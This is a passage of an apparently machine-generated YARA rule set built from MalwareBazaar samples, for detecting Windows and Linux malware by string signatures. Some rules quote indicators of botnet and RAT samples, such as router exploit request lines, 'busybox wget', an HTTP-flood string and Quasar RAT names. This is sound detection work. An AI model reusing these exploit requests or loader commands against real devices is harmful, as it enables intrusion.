        $s15 = "KikiStringFile *[2]"
        $s16 = "KikiStringFile"
        $s17 = "KikiNetConnector *[2]"
        $s18 = "KikiNetConnector *"
        $s19 = "KikiNetConnector"
        $s20 = "KikiWinSockCQueue *[2]"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1352KB and
        all of them
}

rule Linux_db597815bfff48483f47b749fe31ecdb7eeff5ae8876ff96af4157b402edf0a4
{
    meta:
        description = "Auto ML: db597815bfff48483f47b749fe31ecdb7eeff5ae8876ff96af4157b402edf0a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB and
        all of them
}

rule Windows_db726961f1431fd7343b23e90a146a7fd19233d4980815f2d68d50c36bc1175d
{
    meta:
        description = "Auto ML: db726961f1431fd7343b23e90a146a7fd19233d4980815f2d68d50c36bc1175d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB and
        all of them
}

rule Windows_db991cc74187143266c8233db17eee6449754fb5f3f1ccff562ea3f3471729d8
{
    meta:
        description = "Auto ML: db991cc74187143266c8233db17eee6449754fb5f3f1ccff562ea3f3471729d8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_dbcf21a27c826ebb4fc94610736aa18c005732200939e30a3d39f8b96c7ed860
{
    meta:
        description = "Auto ML: dbcf21a27c826ebb4fc94610736aa18c005732200939e30a3d39f8b96c7ed860"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "map/set too long"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2397KB and
        all of them
}

rule Linux_dbed90be7333119e1c0bc18fe88ca3e6d497774feeccef3d28eeae794b69068a
{
    meta:
        description = "Auto ML: dbed90be7333119e1c0bc18fe88ca3e6d497774feeccef3d28eeae794b69068a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Windows_dc0621450142b54d1bae6fe4ceff77ef0e31e26b3626c9f29ff9ba4a1a9a6274
{
    meta:
        description = "Auto ML: dc0621450142b54d1bae6fe4ceff77ef0e31e26b3626c9f29ff9ba4a1a9a6274"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_NsJD"
        $s6 = "get_ImagenURL"
        $s7 = "set_ImagenURL"
        $s8 = "get_Marca"
        $s9 = "set_Marca"
        $s10 = "get_Categoria"
        $s11 = "set_Categoria"
        $s12 = "System.Data"
        $s13 = "setearConsulta"
        $s14 = "System.Collections.Generic"
        $s15 = "Read"
        $s16 = "add_Load"
        $s17 = "frmConSettings_Load"
        $s18 = "set_AutoScaleMode"
        $s19 = "set_SizeMode"
        $s20 = "set_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 902KB and
        all of them
}

rule Linux_dc1a9582d0b1813e52c7d8f344cca98dec098b9b41a7bf174883211c8b6ebaef
{
    meta:
        description = "Auto ML: dc1a9582d0b1813e52c7d8f344cca98dec098b9b41a7bf174883211c8b6ebaef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(!PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 41KB and
        all of them
}

rule Linux_1580e549e2df14253e701b7f032623000d69e1c729614654d8d94f11dde8f40a
{
    meta:
        description = "Auto ML: 1580e549e2df14253e701b7f032623000d69e1c729614654d8d94f11dde8f40a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "[http flood] headers: \"%s\""
        $s4 = "http"
        $s5 = "socket:"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB and
        all of them
}

rule Linux_dc564c16d59f7e130c21b7eefda20d7e3048519ba9b56743774537a807f9a3d6
{
    meta:
        description = "Auto ML: dc564c16d59f7e130c21b7eefda20d7e3048519ba9b56743774537a807f9a3d6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Windows_dc8351cb804dc063b27136910868381f2219662a9634a89853f72031de99585a
{
    meta:
        description = "Auto ML: dc8351cb804dc063b27136910868381f2219662a9634a89853f72031de99585a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "PayloadExecuted"
        $s7 = "C:\\Users\\rangeadmin\\Desktop\\Weaponized\\cscapi\\x64\\Release\\cscapi.pdb"
        $s8 = ".text$di"
        $s9 = ".text$mn"
        $s10 = ".text$mn$00"
        $s11 = ".text$x"
        $s12 = ".text$yd"
        $s13 = ".rdata"
        $s14 = ".rdata$T"
        $s15 = ".rdata$voltmd"
        $s16 = ".rdata$zzzdbg"
        $s17 = ".data"
        $s18 = ".rsrc$01"
        $s19 = ".rsrc$02"
        $s20 = "cscapi.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 14KB and
        all of them
}

rule Windows_dca046105d494683efab5e3ac33d9948c978c255d1cfc8783f03a1414d458c09
{
    meta:
        description = "Auto ML: dca046105d494683efab5e3ac33d9948c978c255d1cfc8783f03a1414d458c09"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "NYCMd"
        $s6 = "SETr"
        $s7 = "etadidnaCdohteMnoitpecxE.setadidnaC.jiophdL+"
        $s8 = "ecnatsnItseT"
        $s9 = "retnirPtseT"
        $s10 = "dohteMpoP"
        $s11 = "dohteMpaM"
        $s12 = "Ztluser"
        $s13 = "rezilaireSetadpU"
        $s14 = "rezilaireSetaluclaC"
        $s15 = "rezilaireSetirW"
        $s16 = "rezilaireStseT"
        $s17 = "rezilaireSetaerC"
        $s18 = "rezilaireSetadilaV"
        $s19 = "rezilaireSetaR"
        $s20 = "rezilaireSetupmoC"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1931KB and
        all of them
}

rule Windows_dcb852bbdd6ebe2221c3e5126c3d0ad98c626f1cdc425fc1b68dbf59eb798a45
{
    meta:
        description = "Auto ML: dcb852bbdd6ebe2221c3e5126c3d0ad98c626f1cdc425fc1b68dbf59eb798a45"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB and
        all of them
}

rule Windows_dccf17e32afc8abc1e8179411260ffe7971826da058cf4f57162c17560c16920
{
    meta:
        description = "Auto ML: dccf17e32afc8abc1e8179411260ffe7971826da058cf4f57162c17560c16920"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB and
        all of them
}

rule Windows_dcf14d2ca4c03349e53216c94512cf010326fa9ff35978e8cd7684862ce14c90
{
    meta:
        description = "Auto ML: dcf14d2ca4c03349e53216c94512cf010326fa9ff35978e8cd7684862ce14c90"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "api-ms-win-crt-string-l1-1-0.dll"
        $s6 = "too many files"
        $s7 = "invalid filename"
        $s8 = "file too large"
        $s9 = "file not found"
        $s10 = "file stat failed"
        $s11 = "file open failed"
        $s12 = "file seek failed"
        $s13 = "write callback failed"
        $s14 = "file write failed"
        $s15 = "file create failed"
        $s16 = "file close failed"
        $s17 = "file read failed"
        $s18 = "Windows Vista"
        $s19 = "Windows Server 2008"
        $s20 = "Windows 8"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 586KB and
        all of them
}

rule Windows_dd02b4f83462302b06278dea2591a9d32ab4534743f96b44b24d642e55b721fb
{
    meta:
        description = "Auto ML: dd02b4f83462302b06278dea2591a9d32ab4534743f96b44b24d642e55b721fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB and
        all of them
}

rule Windows_dd2bb6ea65c082f25a75158f22c2d10e3be1daa026334a8d8e06007bbd245f70
{
    meta:
        description = "Auto ML: dd2bb6ea65c082f25a75158f22c2d10e3be1daa026334a8d8e06007bbd245f70"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "/Gets or sets an annotation's content alignment."
        $s9 = "JGets or sets a flag, which indicates if an annotation anchor can be moved."
        $s10 = "CGets or sets a flag, which indicates if an annotation can be moved."
        $s11 = "fGets or sets a flag which defines if SmartLabels are allowed to be drawn outside of the plotting area."
        $s12 = "TGets or sets a flag, which indicates if the polygon annotation's path can be edited."
        $s13 = "EGets or sets a flag, which indicates if an annotation can be resized."
        $s14 = "FGets or sets a flag, which indicates if an annotation can be selected."
        $s15 = "KGets or sets a flag, which indicates if an annotation's text can be edited."
        $s16 = "@Gets or sets annotation object alignment relative to the anchor."
        $s17 = "9Gets or sets the data point an annotation is anchored to."
        $s18 = ";Gets or sets data point name the annotation is attached to."
        $s19 = "EGets or sets an annotation X position's offset from the anchor point."
        $s20 = "EGets or sets an annotation Y position's offset from the anchor point."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1124KB and
        all of them
}

rule Windows_dd7f5bd431c5ef84cc58b490eed097e76b800d6c822de3de6d68d88881626a3b
{
    meta:
        description = "Auto ML: dd7f5bd431c5ef84cc58b490eed097e76b800d6c822de3de6d68d88881626a3b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
    condition:
        uint32(0) == 0x00805a4d and
        filesize < 37KB and
        all of them
}

rule Linux_dd82275e129410cf5dea29c7f99f949c7a194bf01691d165c1b11318c01ac5c8
{
    meta:
        description = "Auto ML: dd82275e129410cf5dea29c7f99f949c7a194bf01691d165c1b11318c01ac5c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB and
        all of them
}

rule Windows_1582d6131090e7a8c618a7cd3cec1adf0418bb6654a79db1a337525b5d50aa30
{
    meta:
        description = "Auto ML: 1582d6131090e7a8c618a7cd3cec1adf0418bb6654a79db1a337525b5d50aa30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "USER"
        $s5 = "System.Web.Extensions"
        $s6 = "System.Windows.Forms"
        $s7 = "System.Drawing"
        $s8 = "System"
        $s9 = "System.Core"
        $s10 = "System.Runtime.Serialization"
        $s11 = "System.Security"
        $s12 = "System.Xml"
        $s13 = "System.Management"
        $s14 = "kernel32.dll"
        $s15 = "user32.dll"
        $s16 = "msvcrt.dll"
        $s17 = "User32.dll"
        $s18 = "FileInfo"
        $s19 = "System.IO"
        $s20 = "get_Directory"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 474KB and
        all of them
}

rule Windows_ddaa5cc1391856c03a01c6273c79698851078f211eba06dd002c7b4f3ccf75c0
{
    meta:
        description = "Auto ML: ddaa5cc1391856c03a01c6273c79698851078f211eba06dd002c7b4f3ccf75c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = ".data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "network reset"
        $s7 = "no child process"
        $s8 = "no such file or directory"
        $s9 = "no such process"
        $s10 = "not a socket"
        $s11 = "not connected"
        $s12 = "read only file system"
        $s13 = "text file busy"
        $s14 = "too many files open in system"
        $s15 = "too many files open"
        $s16 = "already connected"
        $s17 = "bad file descriptor"
        $s18 = "connection aborted"
        $s19 = "connection already in progress"
        $s20 = "connection refused"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 483KB and
        all of them
}

rule Windows_ddb04224fdedc7b6e5e034aa071ed1f27ab81e680070cb38a31088835fb87dbf
{
    meta:
        description = "Auto ML: ddb04224fdedc7b6e5e034aa071ed1f27ab81e680070cb38a31088835fb87dbf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "GetProcAddress"
        $s7 = "ExitProcess"
        $s8 = "GetVersionExW"
        $s9 = "SetProcessAffinityMask"
        $s10 = "GetSystemMetrics"
        $s11 = "RegCloseKey"
        $s12 = "GetModuleFileNameW"
        $s13 = "ADVAPI32.dll"
        $s14 = "GetProcessWindowStation"
        $s15 = "SHGetFolderPathA"
        $s16 = "GetUserObjectInformationW"
        $s17 = "GetProcessAffinityMask"
        $s18 = "CreateCompatibleBitmap"
        $s19 = "JYget"
        $s20 = "~gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6326KB and
        all of them
}

rule Windows_ddb34974223511c96173ac8099a9f7ac85c30773c19257137ade8da83f7d4120
{
    meta:
        description = "Auto ML: ddb34974223511c96173ac8099a9f7ac85c30773c19257137ade8da83f7d4120"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 3997KB and
        all of them
}

rule Linux_dde5ac7c19bcf11762b0eb96b0f40a1456d3fbbf61ca101b3590b2870a461f0c
{
    meta:
        description = "Auto ML: dde5ac7c19bcf11762b0eb96b0f40a1456d3fbbf61ca101b3590b2870a461f0c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 56KB and
        all of them
}

rule Windows_ddfdcd1867cf1462a6b507d71eb15dd91703c06f55def388c81277c406c3f76d
{
    meta:
        description = "Auto ML: ddfdcd1867cf1462a6b507d71eb15dd91703c06f55def388c81277c406c3f76d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6884KB and
        all of them
}

rule Windows_de4da24486f406177afea313e60468918398dbbdb3551a7290a4050966494728
{
    meta:
        description = "Auto ML: de4da24486f406177afea313e60468918398dbbdb3551a7290a4050966494728"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "file"
        $s4 = "File"
        $s5 = "Load"
        $s6 = "Open"
        $s7 = "Read"
        $s8 = "load"
        $s9 = "read"
        $s10 = "user"
        $s11 = "Close"
        $s12 = "Pread"
        $s13 = "Reset"
        $s14 = "Write"
        $s15 = "close"
        $s16 = "hFile"
        $s17 = "pread"
        $s18 = "reset"
        $s19 = "setId"
        $s20 = "setip"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3632KB and
        all of them
}

rule Windows_de78554d449ccead169dfee188aea7bbd3e2971441bea3730473e13212e940f4
{
    meta:
        description = "Auto ML: de78554d449ccead169dfee188aea7bbd3e2971441bea3730473e13212e940f4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = ".text$mn"
        $s17 = ".text$x"
        $s18 = ".rdata"
        $s19 = ".rdata$r"
        $s20 = ".rdata$sxdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 109KB and
        all of them
}

rule Windows_decfaad9816261d3eba76b67c8965ddce1fc2192e039b62e43b297b25650b4cc
{
    meta:
        description = "Auto ML: decfaad9816261d3eba76b67c8965ddce1fc2192e039b62e43b297b25650b4cc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.reloc"
        $s2 = "@.rsrc"
        $s3 = "i{ADVAPI32.dll"
        $s4 = "GetSystemInfo"
        $s5 = "SHELL32.dll"
        $s6 = "GetStringTypeA"
        $s7 = "SetStdHandle"
        $s8 = "HeapCreate"
        $s9 = "CreateFileW"
        $s10 = "GetModuleHandleW"
        $s11 = "*ycmD"
        $s12 = "CloseHandle"
        $s13 = "GetConsoleCP"
        $s14 = "GetUserDefaultLCID"
        $s15 = "TerminateProcess"
        $s16 = "GetCPInfo"
        $s17 = "WININET.dll"
        $s18 = "GetModuleHandleA"
        $s19 = "GetOEMCP"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6271KB and
        all of them
}

rule Linux_df12fa13cd681ffbda2930712d4b68844810c559aa3024870550e47d65c74e6e
{
    meta:
        description = "Auto ML: df12fa13cd681ffbda2930712d4b68844810c559aa3024870550e47d65c74e6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(!PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB and
        all of them
}

rule Windows_df382a4a8891bd1839dd969666839932af21b5b4b0fec15b8c52ae76e2ebb994
{
    meta:
        description = "Auto ML: df382a4a8891bd1839dd969666839932af21b5b4b0fec15b8c52ae76e2ebb994"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.reloc"
        $s3 = "<Module>"
        $s4 = "System.Reflection"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "AssemblyFileVersionAttribute"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.CodeDom.Compiler"
        $s9 = "System.ComponentModel"
        $s10 = "System.Diagnostics"
        $s11 = "DebuggerNonUserCodeAttribute"
        $s12 = "System"
        $s13 = "Microsoft.VisualBasic.CompilerServices"
        $s14 = "StandardModuleAttribute"
        $s15 = "HideModuleNameAttribute"
        $s16 = "GetObjectValue"
        $s17 = "GetHashCode"
